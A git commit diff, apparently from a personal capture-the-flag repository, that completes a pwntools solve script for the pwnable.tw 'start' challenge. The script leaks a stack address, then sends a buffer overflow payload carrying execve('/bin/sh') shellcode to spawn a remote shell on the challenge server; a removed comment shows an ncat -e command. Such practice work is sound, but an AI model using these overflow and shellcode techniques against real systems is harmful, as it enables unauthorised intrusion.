d675fec41f39668cebb4c7c19911ed0257bffb2c
WildfootW <wild.foot.yee.tzwu@gmail.com>
2018-04-22 21:20:43 +0800

    complete pwnable.tw start

--- pwnable.tw/start/solve.py
+++ pwnable.tw/start/solve.py
@@ -2,8 +2,6 @@
 #   WildfootW 2018
 #   https://github.com/Wildfoot
 #
-# open program at local 
-# ncat -ve ./a.out -kl 8888
 
 from pwn import *
 import time
@@ -12,8 +10,8 @@ context.update(arch="i386", os="linux")
 
 host = "127.0.0.1"
 port = 8888
-#host = "chall.pwnable.tw"
-#port = 10000 
+host = "chall.pwnable.tw"
+port = 10000
 r = remote(host, port)
 
 mov_ecx_esp_cts = 0x8048087
@@ -31,12 +29,18 @@ r.send(payload)
 
 time.sleep(1)
 esp_base = r.recv(512)[0:4]
-print("esp base address :", hex(u32(esp_base)))
+esp_base = hex(u32(esp_base))
+print("esp base address :", esp_base)
 
 # payload
 # ---- ---- ---- ---- ---- ret_address ---- ---- ---- ---- ---- ---- ---- ---- ----
 #      ^[esp base]    ^[esp base + 12]
 #payload = flat(["aaaabaaacaaadaaaeaaa", esp_base, "faaagaaahaaaiaaajaaakaaalaaamaaanaaa"])
+
+shellcode = asm(shellcraft.execve("/bin/sh"))
+shellcode_address = int(esp_base, 16) + 0x14
+payload = flat(["A" * 20, shellcode_address, shellcode])
+print(payload)
 r.send(payload)
 
 r.interactive()
